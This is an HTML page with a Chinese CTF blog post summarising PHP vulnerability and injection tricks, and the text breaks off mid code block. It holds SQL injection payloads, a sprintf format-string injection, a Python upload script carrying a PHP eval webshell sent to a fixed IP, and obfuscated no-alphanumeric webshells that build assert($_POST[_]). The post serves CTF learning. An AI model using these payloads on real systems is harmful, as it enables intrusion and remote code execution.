@@ -1,0 +1,765 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.2.0">
+<meta name="google-site-verification" content="eFIczS6pLawspui5Sm7JUbsaANiKGnqjmDod70iSzI4" />
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon.ico">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon.ico">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+  <link rel="stylesheet" href="/lib/pace/pace-theme-minimal.min.css">
+  <script src="/lib/pace/pace.min.js"></script>
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"yq1ng.github.io","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":"mac"},"back2top":{"enable":true,"sidebar":true,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="自己整理的一些tick，可能有点乱，想到什么就添上    一些简单bypass 数值被ban 一些函数bypass MySQL特性 LFI(local file include)   注入骚姿势 约束注入   PHP 文件泄露 –&gt; phps 探针 雅黑PHP探针 phpinfo   JAVA 文件泄露（叹之师傅博客）   杂七杂八 LINUX 常见源码泄露">
+<meta property="og:type" content="article">
+<meta property="og:title" content="PHP漏洞与注入总结">
+<meta property="og:url" content="http://yq1ng.github.io/z_post/%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/index.html">
+<meta property="og:site_name" content="会下雪的晴天">
+<meta property="og:description" content="自己整理的一些tick，可能有点乱，想到什么就添上    一些简单bypass 数值被ban 一些函数bypass MySQL特性 LFI(local file include)   注入骚姿势 约束注入   PHP 文件泄露 –&gt; phps 探针 雅黑PHP探针 phpinfo   JAVA 文件泄露（叹之师傅博客）   杂七杂八 LINUX 常见源码泄露">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://raw.githubusercontent.com/yq1ng/blog/master/%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/image.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/yq1ng/blog/master/%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/image.17jx3v8rjod.png">
+<meta property="og:image" content="https://www.leavesongs.com/media/attachment/2017/02/17/fadccb70-4143-49df-aa47-bc9a1af93c56.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/yq1ng/blog/master/%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/image.1cs7ybfh0km.png">
+<meta property="article:published_time" content="2020-10-27T08:18:01.000Z">
+<meta property="article:modified_time" content="2020-11-07T15:14:17.740Z">
+<meta property="article:author" content="yq1ng">
+<meta property="article:tag" content="...">
+<meta property="article:tag" content="Java">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/yq1ng/blog/master/%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/image.png">
+
+<link rel="canonical" href="http://yq1ng.github.io/z_post/%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>PHP漏洞与注入总结 | 会下雪的晴天</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">会下雪的晴天</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">CTF菜鸡</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://yq1ng.github.io/z_post/%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/xiaoxin.jpg">
+      <meta itemprop="name" content="yq1ng">
+      <meta itemprop="description" content="The best way to know your strength is to fight">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="会下雪的晴天">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          PHP漏洞与注入总结
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2020-10-27 16:18:01" itemprop="dateCreated datePublished" datetime="2020-10-27T16:18:01+08:00">2020-10-27</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2020-11-07 23:14:17" itemprop="dateModified" datetime="2020-11-07T23:14:17+08:00">2020-11-07</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/" itemprop="url" rel="index"><span itemprop="name">注入总结</span></a>
+                </span>
+                  ，
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/PHP%E6%BC%8F%E6%B4%9E/" itemprop="url" rel="index"><span itemprop="name">PHP漏洞</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span><br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>11k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>18 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>自己整理的一些tick，可能有点乱，想到什么就添上</p>
+<!-- TOC -->
+
+<ul>
+<li><a href="#%E4%B8%80%E4%BA%9B%E7%AE%80%E5%8D%95bypass">一些简单bypass</a><ul>
+<li><a href="#%E6%95%B0%E5%80%BC%E8%A2%ABban">数值被ban</a></li>
+<li><a href="#%E4%B8%80%E4%BA%9B%E5%87%BD%E6%95%B0bypass">一些函数bypass</a></li>
+<li><a href="#mysql%E7%89%B9%E6%80%A7">MySQL特性</a></li>
+<li><a href="#lfilocal-file-include">LFI(local file include)</a></li>
+</ul>
+</li>
+<li><a href="#%E6%B3%A8%E5%85%A5%E9%AA%9A%E5%A7%BF%E5%8A%BF">注入骚姿势</a><ul>
+<li><a href="#%E7%BA%A6%E6%9D%9F%E6%B3%A8%E5%85%A5">约束注入</a></li>
+</ul>
+</li>
+<li><a href="#php">PHP</a><ul>
+<li><a href="#%E6%96%87%E4%BB%B6%E6%B3%84%E9%9C%B2----phps">文件泄露 –&gt; phps</a></li>
+<li><a href="#%E6%8E%A2%E9%92%88-%E9%9B%85%E9%BB%91php%E6%8E%A2%E9%92%88-phpinfo">探针 雅黑PHP探针 phpinfo</a></li>
+</ul>
+</li>
+<li><a href="#java">JAVA</a><ul>
+<li><a href="#%E6%96%87%E4%BB%B6%E6%B3%84%E9%9C%B2%E5%8F%B9%E4%B9%8B%E5%B8%88%E5%82%85%E5%8D%9A%E5%AE%A2">文件泄露（叹之师傅博客）</a></li>
+</ul>
+</li>
+<li><a href="#%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB">杂七杂八</a><ul>
+<li><a href="#linux">LINUX</a></li>
+<li><a href="#%E5%B8%B8%E8%A7%81%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2">常见源码泄露</a></li>
+</ul>
+</li>
+</ul>
+<!-- /TOC -->
+
+<a id="more"></a>
+
+<h1 id="一些简单bypass"><a href="#一些简单bypass" class="headerlink" title="一些简单bypass"></a>一些简单bypass</h1><h2 id="数值被ban"><a href="#数值被ban" class="headerlink" title="数值被ban"></a>数值被ban</h2><p>查询数值（1000）被ban，如<strong>ctfshow萌新萌新计划 web 1-8</strong></p>
+<ul>
+<li>二进制、十六进制数值绕过，如<code>0b1111101000</code>，<code>0x38e</code></li>
+<li>运算符绕过\</li>
+</ul>
+<p>1.乘法 200*5<br>2.除法 10/0.01<br>3.减法 200–80<br>4.负负 –1000<br>5.加法 200+800（地址栏输入的话把+换成%2b）</p>
+<ul>
+<li>注入绕过，<code>id=1 or 1=1#</code>，<code>id=id#</code>(关于第二个，id=id就是输出全部，在MySQL里不加引号的可以理解为变量，而id就相当于一个数组，里面存了所有id值)</li>
+</ul>
+<h2 id="一些函数bypass"><a href="#一些函数bypass" class="headerlink" title="一些函数bypass"></a>一些函数bypass</h2><ol>
+<li><p><code>intval()</code> –&gt; 用于获取变量的整数值</p>
+<ul>
+<li>用法<br><img src="https://raw.githubusercontent.com/yq1ng/blog/master/%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/image.png" alt="use"></li>
+<li>特性：直到遇上数字或正负符号才开始做转换，再遇到非数字或字符串结束时(\0)结束转换<br>如：intval(‘100a123’)=100；intval(‘a123’)=0</li>
+<li>Intval最大的值取决于操作系统，32位带符号int范围(-2147483648,2147483647)，此处应用：判断数值是不是回文，如果参数为2147483647，那么当它反过来，由于超出了限制，所以依然等于2147483647，即为回文</li>
+<li>eg：<br><code>intval($req[&quot;number&quot;])=intval(strrev($req[&quot;number&quot;]))</code>  如果要求不是回文，但又要满足这个条件，可以用科学计数法构造0=0：<code>number=0e-0%00</code></li>
+</ul>
+</li>
+<li><p><code>is_numeric()</code> –&gt; 判断变量是否为数字或数字字符串(10进制、16进制)</p>
+<ul>
+<li>bypass：空字符%00<br>无论是%00放在前后都可以判断为非数值，但是%20空格字符只能放在数值后</li>
+<li>该函数还可能造成sql注入，例如将<code>&#39;1 or 1&#39;</code>转换为16进制形式，再传参，就可以造成sql注入</li>
+</ul>
+</li>
+<li><p><code>preg_match()</code> –&gt; 用于执行一个正则表达式匹配</p>
+<ul>
+<li><p>用法：<br><img src="https://raw.githubusercontent.com/yq1ng/blog/master/%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/image.17jx3v8rjod.png" alt="use"><br>模式分隔符后的”i”标记这是一个大小写不敏感的搜索<br>模式中的 \b 标记一个单词边界(通常成对出现)</p>
+</li>
+<li><p>数组绕过<br>preg_match只能处理字符串，当传入的subject是数组时会返回false</p>
+</li>
+<li><p>PCRE回溯次数限制(100万)<br><a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html">PHP利用PCRE回溯次数限制绕过某些安全限制</a></p>
+  <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//exp</span></span><br><span class="line">import requests</span><br><span class="line"><span class="keyword">from</span> io import BytesIO</span><br><span class="line"></span><br><span class="line">files = &#123;</span><br><span class="line"><span class="string">&#x27;file&#x27;</span>: BytesIO(<span class="string">b&#x27;aaa&lt;?php eval($_POST[txt]);//&#x27;</span> + <span class="string">b&#x27;a&#x27;</span> * <span class="number">1000000</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">res = requests.post(<span class="string">&#x27;http://51.158.75.42:8088/index.php&#x27;</span>, files=files, allow_redirects=<span class="literal">False</span>)</span><br><span class="line"><span class="keyword">print</span>(res.headers)</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>换行符污染字符串<br><code>%0a</code>或<code>\n</code>换行污染字符串，如<code>\nflag</code>,<code>%0aflag</code></p>
+</li>
+<li><p>构造法绕过函数<br><code>$a=&#39;sys&#39;;$b=&#39;tem&#39;;$d=$a.$b;$d(&#39;cat flag.php&#39;);</code></p>
+</li>
+</ul>
+</li>
+<li><p><code>sprintf()</code>绕过addslashes或者mysql_real_escape_string等之类的过滤\</p>
+<ul>
+<li><p>参考：<br><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/3f14bae3396f">参考博客</a>\</p>
+</li>
+<li><p>用法示例\</p>
+  <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$pass=sprintf(<span class="string">&quot;and pass=&#x27;%s&#x27;&quot;</span>,addslashes($_GET[<span class="string">&#x27;pass&#x27;</span>]));</span><br><span class="line">$sql=sprintf(<span class="string">&quot;select * from user where name=&#x27;%s&#x27; <span class="subst">$pass</span>&quot;</span>,addslashes($_GET[<span class="string">&#x27;name&#x27;</span>]));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p> <code>?name=admin&amp;pass=admin%1$&#39; or(1)%23</code><br> <code>%1$</code>其中%后面的数字代表着第几个参数，$符号在这里的作用是中止符，用来检测前面有几个数字的，而$符号后面的字母代表着参数类型，s表示stirng类型</p>
+</li>
+</ul>
+</li>
+<li><p>URL默认不编码数字字母，浏览器会自动编码一次，所以php的<code>$_GET()</code>会自动解URL编码一次</p>
+</li>
+<li><p>弱比较md5<br>数组绕过，不能处理数组返回<code>false</code><br>0e开头的会被识别为科学记数法，结果均为0，所以只需找两个md5后都为0e开头且0e后面均为数字的值即可</p>
+<blockquote>
+<p>QNKCDZO<br> 0e830400451993494058024219903391<br> s878926199a<br> 0e545993274517709034328855841020<br> s155964671a<br> 0e342768416822451524974117254469<br> s214587387a<br> 0e848240448830537924465865611904<br> s214587387a<br> 0e848240448830537924465865611904<br> s878926199a<br> 0e545993274517709034328855841020<br> s1091221200a<br> 0e940624217856561557816327384675<br> s1885207154a<br> 0e509367213418206700842008763514</p>
+</blockquote>
+<p>特例：<code>$md5==md5(md5($md5))</code> –&gt; <code>0e1138100474</code>\</p>
+</li>
+<li><p>强比较md5<br>2018年强网杯初赛【Web签到】第三关</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>((<span class="keyword">string</span>)$_POST[<span class="string">&#x27;param1&#x27;</span>]!==(<span class="keyword">string</span>)$_POST[<span class="string">&#x27;param2&#x27;</span>] &amp;&amp; md5($_POST[<span class="string">&#x27;param1&#x27;</span>])===md5($_POST[<span class="string">&#x27;param2&#x27;</span>]))</span><br><span class="line"> <span class="keyword">die</span>(<span class="string">&quot;success!);</span></span><br></pre></td></tr></table></figure>
+<p> 很典型的一个强比较，<a target="_blank" rel="noopener" href="https://crypto.stackexchange.com/questions/1434/are-there-two-known-strings-which-have-the-same-md5-hash-value">md5强碰撞收集</a>or固定字符碰撞：</p>
+ <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">param1&#x3D;%D11%DD%02%C5%E6%EE%C4i%3D%9A%06%98%AF%F9%5C%2F%CA%B5%87%12F%7E%AB%40%04X%3E%B8%FB%7F%89U%AD4%06%09%F4%B3%02%83%E4%88%83%25qAZ%08Q%25%E8%F7%CD%C9%9F%D9%1D%BD%F2%807%3C%5B%D8%82%3E1V4%8F%5B%AEm%AC%D46%C9%19%C6%DDS%E2%B4%87%DA%03%FD%029c%06%D2H%CD%A0%E9%9F3B%0FW%7E%E8%CET%B6p%80%A8%0D%1E%C6%98%21%BC%B6%A8%83%93%96%F9e%2Bo%F7%2Ap</span><br><span class="line"></span><br><span class="line">param2&#x3D;%D11%DD%02%C5%E6%EE%C4i%3D%9A%06%98%AF%F9%5C%2F%CA%B5%07%12F%7E%AB%40%04X%3E%B8%FB%7F%89U%AD4%06%09%F4%B3%02%83%E4%88%83%25%F1AZ%08Q%25%E8%F7%CD%C9%9F%D9%1D%BDr%807%3C%5B%D8%82%3E1V4%8F%5B%AEm%AC%D46%C9%19%C6%DDS%E24%87%DA%03%FD%029c%06%D2H%CD%A0%E9%9F3B%0FW%7E%E8%CET%B6p%80%28%0D%1E%C6%98%21%BC%B6%A8%83%93%96%F9e%ABo%F7%2Ap</span><br></pre></td></tr></table></figure>
+ <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">param1&#x3D;M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3Bu%93%D8Igm%A0%D1U%5D%83%60%FB%07%FE%A2</span><br><span class="line"></span><br><span class="line">param2&#x3D;M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB%07%FE%A2</span><br></pre></td></tr></table></figure></li>
+<li><p><code>preg_match()</code> –&gt; 正则匹配<br>可以用<code>&#39;&#39;</code>单引号绕过，或者在字符串最后加上<code>%0a（换行）/%0c</code>等不可见字符污染字符串来绕过</p>
+</li>
+</ol>
+<h2 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h2><ol>
+<li>常见RCE函数</li>
+</ol>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">system()</span><br><span class="line">passthru()</span><br><span class="line">exec()</span><br><span class="line">shell_exec()</span><br><span class="line">popen()</span><br><span class="line">proc_open()</span><br><span class="line">pcntl_exec()</span><br></pre></td></tr></table></figure>
+
+<ol start="2">
+<li><p>反引号在linux的用法<br>在linux中反引号的作用就是将反引号内的Linux命令先执行，然后将执行结果赋予变量<br>比如 cat <code>ls</code> 相当于将 ls出来的结果cat</p>
+</li>
+<li><p>分号过滤<br><del>闭合php不是只有<code>?&gt;</code>，也可以不用（这条是废话）</del> 分号作为PHP语句的结尾，起到表示语句结尾和语句间分隔的作用，而对于php的单行模式是不需要分号的，因此用?&gt;&lt;?来bypass分号</p>
+</li>
+<li><p>过滤括号<br>使用那些不需要括号的函数，例如<code>require</code><br>由于PHP黑魔法 <code>require</code>和取反运算符之间不需要空格照样执行</p>
+</li>
+<li><p>过滤引号<br>没有引号表示不能自己传参数，可以使用取反运算</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">$a = <span class="string">&#x27;/flag&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> urlencode(~$a);</span><br></pre></td></tr></table></figure></li>
+<li><p>过滤字母、数字(<a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html">P神链接</a>)<br>PHP允许动态函数执行:$f=’assert’;$f(…);<br>版本： php5\</p>
+<ul>
+<li><p>字符异或拼接字符串</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$_=(<span class="string">&#x27;%01&#x27;</span>^<span class="string">&#x27;`&#x27;</span>).(<span class="string">&#x27;%13&#x27;</span>^<span class="string">&#x27;`&#x27;</span>).(<span class="string">&#x27;%13&#x27;</span>^<span class="string">&#x27;`&#x27;</span>).(<span class="string">&#x27;%05&#x27;</span>^<span class="string">&#x27;`&#x27;</span>).(<span class="string">&#x27;%12&#x27;</span>^<span class="string">&#x27;`&#x27;</span>).(<span class="string">&#x27;%14&#x27;</span>^<span class="string">&#x27;`&#x27;</span>); <span class="comment">// $_=&#x27;assert&#x27;;</span></span><br><span class="line">$__=<span class="string">&#x27;_&#x27;</span>.(<span class="string">&#x27;%0D&#x27;</span>^<span class="string">&#x27;]&#x27;</span>).(<span class="string">&#x27;%2F&#x27;</span>^<span class="string">&#x27;`&#x27;</span>).(<span class="string">&#x27;%0E&#x27;</span>^<span class="string">&#x27;]&#x27;</span>).(<span class="string">&#x27;%09&#x27;</span>^<span class="string">&#x27;]&#x27;</span>); <span class="comment">// $__=&#x27;_POST&#x27;;</span></span><br><span class="line">$___=$$__;</span><br><span class="line">$_($___[_]); <span class="comment">// assert($_POST[_]);</span></span><br></pre></td></tr></table></figure></li>
+<li><p>字符取反<br><img src="https://www.leavesongs.com/media/attachment/2017/02/17/fadccb70-4143-49df-aa47-bc9a1af93c56.jpg" alt="P神图"></p>
+</li>
+</ul>
+</li>
+</ol>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">  $__=(<span class="string">&#x27;&gt;&#x27;</span>&gt;<span class="string">&#x27;&lt;&#x27;</span>)+(<span class="string">&#x27;&gt;&#x27;</span>&gt;<span class="string">&#x27;&lt;&#x27;</span>);</span><br><span class="line">$_=$__/$__;</span><br><span class="line"></span><br><span class="line">$____=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line">$___=<span class="string">&quot;瞰&quot;</span>;$____.=~($___&#123;$_&#125;);$___=<span class="string">&quot;和&quot;</span>;$____.=~($___&#123;$__&#125;);$___=<span class="string">&quot;和&quot;</span>;$____.=~($___&#123;$__&#125;);$___=<span class="string">&quot;的&quot;</span>;$____.=~($___&#123;$_&#125;);$___=<span class="string">&quot;半&quot;</span>;$____.=~($___&#123;$_&#125;);$___=<span class="string">&quot;始&quot;</span>;$____.=~($___&#123;$__&#125;);</span><br><span class="line"></span><br><span class="line">$_____=<span class="string">&#x27;_&#x27;</span>;$___=<span class="string">&quot;俯&quot;</span>;$_____.=~($___&#123;$__&#125;);$___=<span class="string">&quot;瞰&quot;</span>;$_____.=~($___&#123;$__&#125;);$___=<span class="string">&quot;次&quot;</span>;$_____.=~($___&#123;$_&#125;);$___=<span class="string">&quot;站&quot;</span>;$_____.=~($___&#123;$_&#125;);</span><br><span class="line"></span><br><span class="line">$_=$$_____;</span><br><span class="line">$____($_[$__]);</span><br><span class="line"><span class="comment">//POST: 2=phpinfo();</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><p>php特性tick<br><code>&#39;a&#39;++ =&gt; &#39;b&#39;，&#39;b&#39;++ =&gt; &#39;c&#39;,...,&#39;z&#39;++ =&gt; &#39;aa&#39;</code>通过自增得到所有字母<br>利用<code>Array</code>可以同时获取<code>A</code>和<code>a</code>，在PHP中，如果强制连接数组和字符串的话，数组将被转换成字符串，其值为<code>Array</code><br><img src="https://raw.githubusercontent.com/yq1ng/blog/master/%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/image.1cs7ybfh0km.png" alt="Arreay"><br>PHP函数是大小写不敏感的，所以我们最终执行的是ASSERT($<em>POST[</em>])，无需获取小写a</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$_=[];</span><br><span class="line">$_=@<span class="string">&quot;<span class="subst">$_</span>&quot;</span>; <span class="comment">// $_=&#x27;Array&#x27;;</span></span><br><span class="line">$_=$_[<span class="string">&#x27;!&#x27;</span>==<span class="string">&#x27;@&#x27;</span>]; <span class="comment">// $_=$_[0];</span></span><br><span class="line">$___=$_; <span class="comment">// A</span></span><br><span class="line">$__=$_;</span><br><span class="line">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;</span><br><span class="line">$___.=$__; <span class="comment">// S</span></span><br><span class="line">$___.=$__; <span class="comment">// S</span></span><br><span class="line">$__=$_;</span><br><span class="line">$__++;$__++;$__++;$__++; <span class="comment">// E </span></span><br><span class="line">$___.=$__;</span><br><span class="line">$__=$_;</span><br><span class="line">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; <span class="comment">// R</span></span><br><span class="line">$___.=$__;</span><br><span class="line">$__=$_;</span><br><span 